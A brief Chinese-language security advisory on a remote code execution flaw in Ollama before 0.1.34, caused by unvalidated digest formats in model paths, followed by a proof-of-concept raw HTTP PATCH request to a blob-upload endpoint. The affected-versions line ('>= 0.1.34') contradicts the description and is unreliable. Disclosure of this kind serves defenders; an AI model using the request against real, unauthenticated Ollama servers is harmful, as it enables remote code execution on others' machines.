**漏洞介绍**

Ollama是Ollama开源的一个可以在本地启动并运行的大型语言模型。

Ollama 0.1.34之前版本存在安全漏洞，该漏洞源于在获取模型路径时不验证摘要的格式，会错误处理测试用例。没有强制身份验证的Ollama服务器上，攻击者可通过操控服务器接口下载恶意文件，从而导致远程代码执行。

**影响版本**

Ollama >= 0.1.34

**漏洞复现**

**POC** 

漏洞复现

```yaml
PATCH /v2/rogue/bi0x/blobs/uploads/3647298c-9588-4dd2-9bbe-0539533d2d04?_state=eBQ2_sxwOJVy8DZMYYZ8wA8NBrJjmdINFUMM6uEZyYF7Ik5hbWUiOiJyb2d1ZS9sbGFtYTMiLCJVVUlEIjoiMzY0NzI5OGMtOTU4OC00ZGQyLTliYmUtMDUzOTUzM2QyZDA0IiwiT2Zmc2V0IjowLCJTdGFydGVkQXQiOiIyMDI0LTA2LTI1VDEzOjAxOjExLjU5MTkyMzgxMVoifQ%3D%3D HTTP/1.1
Host: 127.0.0.1
User-Agent: ollama/0.1.33 (amd64 linux) Go/go1.22.1
Content-Length: 501
Content-Range: 0-500
Content-Type: application/octet-stream
X-Redirect-Uploads: 1
Accept-Encoding: gzip

```

